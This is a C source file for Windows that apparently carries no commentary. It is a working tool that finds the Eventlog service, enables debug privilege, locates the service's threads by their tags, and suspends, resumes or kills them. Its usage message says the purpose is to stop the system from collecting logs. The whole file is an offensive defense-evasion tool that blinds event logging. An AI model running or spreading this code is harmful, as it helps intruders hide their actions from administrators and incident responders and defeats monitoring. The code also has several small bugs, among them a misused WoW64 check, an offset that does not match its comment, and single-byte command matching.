#include <windows.h>  
#include <Strsafe.h>
#include <tlhelp32.h>  

#pragma comment(lib,"Advapi32.lib")

typedef long NTSTATUS;

typedef struct _CLIENT_ID
{
	DWORD       uniqueProcess;
	DWORD       uniqueThread;

} CLIENT_ID, *PCLIENT_ID;

typedef struct _THREAD_BASIC_INFORMATION
{
	NTSTATUS    exitStatus;
	PVOID       pTebBaseAddress;
	CLIENT_ID   clientId;
	KAFFINITY               AffinityMask;
	int						Priority;
	int						BasePriority;
	int						v;

} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;



typedef enum _SC_SERVICE_TAG_QUERY_TYPE
{
	ServiceNameFromTagInformation = 1,
	ServiceNameReferencingModuleInformation,
	ServiceNameTagMappingInformation,
} SC_SERVICE_TAG_QUERY_TYPE, *PSC_SERVICE_TAG_QUERY_TYPE;

typedef struct _SC_SERVICE_TAG_QUERY
{
	ULONG   processId;
	ULONG   serviceTag;
	ULONG   reserved;
	PVOID   pBuffer;
} SC_SERVICE_TAG_QUERY, *PSC_SERVICE_TAG_QUERY;

typedef ULONG(WINAPI* FN_I_QueryTagInformation)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);
typedef NTSTATUS(WINAPI* FN_NtQueryInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);

BOOL GetServiceTagString(DWORD processId, ULONG tag, PWSTR pBuffer, SIZE_T bufferSize)
{

	BOOL success = FALSE;
	HMODULE advapi32 = NULL;
	FN_I_QueryTagInformation pfnI_QueryTagInformation = NULL;
	SC_SERVICE_TAG_QUERY tagQuery = { 0 };
	do
	{
		advapi32 = LoadLibrary(L"advapi32.dll");
		if (advapi32 == NULL)
			break;
		pfnI_QueryTagInformation = (FN_I_QueryTagInformation)GetProcAddress(advapi32, "I_QueryTagInformation");
		if (pfnI_QueryTagInformation == NULL)
			break;
		tagQuery.processId = processId;
		tagQuery.serviceTag = tag;
		pfnI_QueryTagInformation(NULL, ServiceNameFromTagInformation, &tagQuery);
		if (tagQuery.pBuffer)
		{
			StringCbCopy(pBuffer, bufferSize, (PCWSTR)tagQuery.pBuffer);
			LocalFree(tagQuery.pBuffer);
			success = TRUE;
		}
	} while (FALSE);
	if (advapi32)
		FreeLibrary(advapi32);
	return success;
}

BOOL GetServiceTag(DWORD processId, DWORD threadId, PULONG pServiceTag)
{

	BOOL success = FALSE;
	BOOL bIsWoW64 = FALSE;
	NTSTATUS status = 0;
	FN_NtQueryInformationThread pfnNtQueryInformationThread = NULL;
	THREAD_BASIC_INFORMATION threadBasicInfo = { 0 };
	HANDLE process = NULL;
	HANDLE thread = NULL;
	HANDLE subProcessTag = NULL;
	DWORD dwOffset = NULL;
	do
	{
		pfnNtQueryInformationThread = (FN_NtQueryInformationThread)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationThread");
		if (pfnNtQueryInformationThread == NULL)
			break;
		thread = OpenThread(THREAD_QUERY_LIMITED_INFORMATION, FALSE, threadId);
		if (thread == NULL)
			break;
		status = pfnNtQueryInformationThread(thread, (THREAD_INFORMATION_CLASS)0, &threadBasicInfo, sizeof(threadBasicInfo), NULL);
		if (status != 0)
			break;
		process = OpenProcess(PROCESS_VM_READ, FALSE, processId);
		if (process == NULL)
			break;
		// SubProcessTag Offset : x86 = 0xf60 / x64 = 0x1720
		bIsWoW64 = IsWow64Process(GetCurrentProcess(), &bIsWoW64);
		if (bIsWoW64)
			dwOffset = 0x1720;
		else
			dwOffset = 0x60;

		if (!ReadProcessMemory(process, ((PBYTE)threadBasicInfo.pTebBaseAddress + dwOffset), &subProcessTag, sizeof(subProcessTag), NULL))
			break;
		if (pServiceTag)
			*pServiceTag = (ULONG)subProcessTag;
		success = TRUE;
	} while (FALSE);
	if (process)
		CloseHandle(process);
	if (thread)
		CloseHandle(thread);
	return success;
}

BOOL SetPrivilege()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES NewState;
	LUID luidPrivilegeLUID;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken) || !LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidPrivilegeLUID))
	{
		printf("SetPrivilege Error\n");
		return FALSE;
	}
	NewState.PrivilegeCount = 1;
	NewState.Privileges[0].Luid = luidPrivilegeLUID;
	NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &NewState, NULL, NULL, NULL))
	{
		printf("AdjustTokenPrivilege Errro\n");
		return FALSE;
	}
	return TRUE;
}

void KillEventlogThread(DWORD tid)
{
	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
	if (TerminateThread(hThread, 0) == 0)
		printf(" error\n");
	else
		printf(" success\n");
	CloseHandle(hThread);
}

void SuspendEventlogThread(DWORD tid)
{
	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
	if (SuspendThread(hThread) == -1)
		printf(" error\n");
	else
		printf(" success\n");
	CloseHandle(hThread);
}

void ResumeEventlogThread(DWORD tid)
{
	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
	if (ResumeThread(hThread) == -1)
		printf(" error\n");
	else
		printf(" success\n");
	CloseHandle(hThread);
}

BOOL GetServiceTagName(DWORD tid, char *command)
{

	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
	if (NULL == hThread)
	{
		printf("OpenThread : %u Error! ErrorCode:%u\n", tid, GetLastError());
		return 0;
	}
	FN_NtQueryInformationThread fn_NtQueryInformationThread = NULL;
	HINSTANCE hNTDLL = GetModuleHandle(_T("ntdll"));
	fn_NtQueryInformationThread = (FN_NtQueryInformationThread)GetProcAddress(hNTDLL, "NtQueryInformationThread");
	THREAD_BASIC_INFORMATION threadBasicInfo;
	LONG status = fn_NtQueryInformationThread(hThread, (THREAD_INFORMATION_CLASS)0, &threadBasicInfo, sizeof(threadBasicInfo), NULL);
	//	printf("process ID is %u\n",threadBasicInfo.clientId.uniqueProcess); 
	//	printf("Thread ID is %u\n",threadBasicInfo.clientId.uniqueThread); 
	CloseHandle(hThread);
	DWORD pid = threadBasicInfo.clientId.uniqueProcess;
//	printf("[+] Query Service Tag %u.%u\n", pid, tid);
	ULONG serviceTag = 0;
	if (GetServiceTag(pid, tid, &serviceTag) == FALSE)
	{
		return 0;
	}
	WCHAR tagString[MAX_PATH] = { 0 };
	if (GetServiceTagString(pid, serviceTag, tagString, sizeof(tagString)) == FALSE)
	{
		return 0;
	}
	//    wprintf(L"Service Tag Name : %s\n", tagString);
	_wcslwr_s(tagString, wcslen(tagString) + 1);
	if (wcscmp(tagString, L"eventlog") == 0)
	{
		if (memcmp(command, "suspend", 1) == 0)
		{
			printf("[+]Tid:%d", tid);
			printf(" suspend");
			SuspendEventlogThread(tid);
		}

		if (memcmp(command, "resume", 1) == 0)
		{
			printf("[+]Tid:%d", tid);
			printf(" resume");
			ResumeEventlogThread(tid);
		}

		if (memcmp(command, "kill", 1) == 0)
		{
			printf("[+]Tid:%d", tid);
			printf(" kill");
			KillEventlogThread(tid);
		}
	}
}

BOOL ListProcessThreads(DWORD pid, char *command)
{
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
		return(FALSE);
	te32.dwSize = sizeof(THREADENTRY32);
	if (!Thread32First(hThreadSnap, &te32))
	{
		printf("[!]Thread32First");
		CloseHandle(hThreadSnap);
		return(FALSE);
	}
	do
	{
		if (te32.th32OwnerProcessID == pid)
		{
			//            printf("tid= %d\n",te32.th32ThreadID);  
			GetServiceTagName(te32.th32ThreadID, command);
		}
	} while (Thread32Next(hThreadSnap, &te32));
	CloseHandle(hThreadSnap);
	return(TRUE);
}

BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}

DWORD  getpid()
{
	DWORD PID = 0;
	SC_HANDLE scHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (scHandle == NULL)
	{
		printf("[!]OpenSCManager fail(%ld)", GetLastError());
	}
	else
	{
		SC_ENUM_TYPE infoLevel = SC_ENUM_PROCESS_INFO;
		DWORD dwServiceType = SERVICE_WIN32;
		DWORD dwServiceState = SERVICE_STATE_ALL;
		LPBYTE lpServices = NULL;
		DWORD cbBufSize = 0;
		DWORD pcbBytesNeeded;
		DWORD servicesReturned;
		LPDWORD lpResumeHandle = NULL;
		LPWSTR pszGroupName = NULL;
		BOOL ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
		cbBufSize = pcbBytesNeeded;
		lpServices = new BYTE[cbBufSize];
		if (NULL == lpServices)
		{
			printf("[!]lpServices = new BYTE[%ld] -> fail(%ld)\n", cbBufSize, GetLastError());
		}
		else
		{
			ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
			LPENUM_SERVICE_STATUS_PROCESS lpServiceStatusProcess = (LPENUM_SERVICE_STATUS_PROCESS)lpServices;
			for (DWORD i = 0; i < servicesReturned; i++)
			{
				_wcslwr_s(lpServiceStatusProcess[i].lpServiceName, wcslen(lpServiceStatusProcess[i].lpServiceName) + 1);
				if (wcscmp(lpServiceStatusProcess[i].lpServiceName, L"eventlog") == 0)
				{
					printf("[+]PID:%ld\n", lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId);
					PID = lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId;
				}
			}
			delete[] lpServices;
		}
		CloseServiceHandle(scHandle);
	}
	return PID;
}

int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("Suspend or resume the Eventlog Service's thread.Use to stop or resume the system to collect logs.\n");
		printf("Usage:\n");
		printf("%s <flag>\n", argv[0]);
		printf("eg:\n");
		printf("     %s suspend\n", argv[0]);
		printf("     %s resume\n", argv[0]);
		printf("     %s kill\n", argv[0]);
		return 0;
	}
	
	DWORD pid = getpid();
	if (pid == 0)
	{
		printf("[!]Get EventLog's PID error\n");
		return -1;
	}

	printf("[*]Try to EnableDebugPrivilege... ");
	if (!EnableDebugPrivilege(TRUE))
	{
		printf("[!]AdjustTokenPrivileges Failed.<%d>\n", GetLastError());
		return -1;
	}
	printf("Done\n");

	ListProcessThreads(pid,argv[1]);

	return 0;
}
